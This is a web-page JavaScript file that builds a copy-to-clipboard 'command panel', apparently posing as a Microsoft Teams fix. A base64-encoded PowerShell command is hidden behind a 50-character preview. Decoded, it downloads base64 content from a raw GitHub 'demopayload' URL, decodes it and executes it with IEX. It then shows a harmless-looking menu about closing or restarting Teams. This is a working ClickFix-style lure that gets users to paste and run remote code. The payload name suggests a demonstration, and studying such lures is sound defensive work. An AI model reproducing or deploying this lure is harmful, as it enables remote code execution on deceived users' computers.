const DISPLAY_CHAR_LIMIT = 50;
const commandPanels = document.querySelectorAll(".command-panel");
const FULL_COMMAND = atob(
  "R2V0LVByb2Nlc3MgLU5hbWUgIm1zLXRlYW1zIiwgIlRlYW1zIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IG91dC1OdWxsOyAkU3R1ZmYgPSAoaXdyIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9DeXBCbmsvU2NyaXB0cy1hbmQtVG9vbHMvcmVmcy9oZWFkcy9tYWluL3NyYy9KUy9kZW1vcGF5bG9hZCkuY29udGVudDsgJHogPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRTdHVmZi5UcmltKCkpKTsgSUVYICR6IHwgb3V0LU5VbGw7IFdyaXRlLUhvc3QgIlNlbGVjdCBhbiBvcHRpb246IiAtRm9yZWdyb3VuZENvbG9yIEN5YW47IFdyaXRlLUhvc3QgIjEgLSBDbG9zZSBQcm9ncmFtIjsgV3JpdGUtSG9zdCAiMiAtIENsb3NlIFByb2dyYW0gYW5kIFN0YXJ0IFRlYW1zIjsgJGMgPSAoUmVhZC1Ib3N0ICJFbnRlciAxIG9yIDIiKS5UcmltKCk7IGlmICgkYyAtbmUgIjEiIC1hbmQgJGMgLW5lICIyIikgeyBXcml0ZS1Ib3N0ICJJbnZhbGlkIGlucHV0LiBQbGVhc2UgZW50ZXIgMSBvciAyLiIgLUZvcmVncm91bmRDb2xvciBZZWxsb3cgfSB3aGlsZSAoJGMgLW5lICIxIiAtYW5kICRjIC1uZSAiMiIpIHsgaWYgKCRjIC1lcSAiMSIpIHsgV3JpdGUtSG9zdCAiU3RhdHVzOiBQcm9ncmFtIGNsb3NlZC4iIC1Gb3JlZ3JvdW5kQ29sb3IgR3JlZW4gfWVsc2UgeyB0cnkgeyBTdGFydC1Qcm9jZXNzICJtc3RlYW1zOiI7IFdyaXRlLUhvc3QgIlN0YXR1czogUHJvZ3JhbSBjbG9zZWQgYW5kIFRlYW1zIHN0YXJ0ZWQuIiAtRm9yZWdyb3VuZENvbG9yIEdyZWVuIH1jYXRjaCB7IFdyaXRlLUhvc3QgIlN0YXR1czogQ291bGQgbm90IHN0YXJ0IFRlYW1zIGF1dG9tYXRpY2FsbHkuIiAtRm9yZWdyb3VuZENvbG9yIFJlZCB9IH0gfQ==",
);

function getDisplayText(text) {
  return text.length > DISPLAY_CHAR_LIMIT
    ? `${text.slice(0, DISPLAY_CHAR_LIMIT)}...`
    : text;
}

function setCommandDisplay(commandElement) {
  if (!commandElement) {
    return;
  }

  commandElement.textContent = getDisplayText(FULL_COMMAND);
  commandElement.title = FULL_COMMAND;
}

async function copyCustomCommand(commandElement, statusElement) {
  if (!FULL_COMMAND) {
    if (statusElement) {
      statusElement.textContent = "No command found to copy.";
    }
    return;
  }

  try {
    await navigator.clipboard.writeText(FULL_COMMAND);
    if (statusElement) {
      statusElement.textContent = "Command copied to clipboard.";
    }
  } catch (error) {
    const textArea = document.createElement("textarea");
    textArea.value = FULL_COMMAND;
    textArea.setAttribute("readonly", "");
    textArea.style.position = "fixed";
    textArea.style.left = "-9999px";
    document.body.appendChild(textArea);
    textArea.focus();
    textArea.select();

    try {
      const copied = document.execCommand("copy");
      if (copied) {
        if (statusElement) {
          statusElement.textContent = "Command copied to clipboard.";
        }
      } else if (statusElement) {
        statusElement.textContent =
          "Unable to copy automatically. Select the command and press Ctrl+C.";
      }
    } catch (execError) {
      if (statusElement) {
        statusElement.textContent =
          "Unable to copy automatically. Select the command and press Ctrl+C.";
      }
    } finally {
      document.body.removeChild(textArea);
    }
  }
}

for (const panel of commandPanels) {
  const commandElement = panel.querySelector(".command-text");
  const copyButton = panel.querySelector(".copy-btn");
  const statusElement = panel.querySelector(".copy-status");

  setCommandDisplay(commandElement);

  if (copyButton && commandElement) {
    copyButton.addEventListener("click", () => {
      copyCustomCommand(commandElement, statusElement);
    });
  }
}
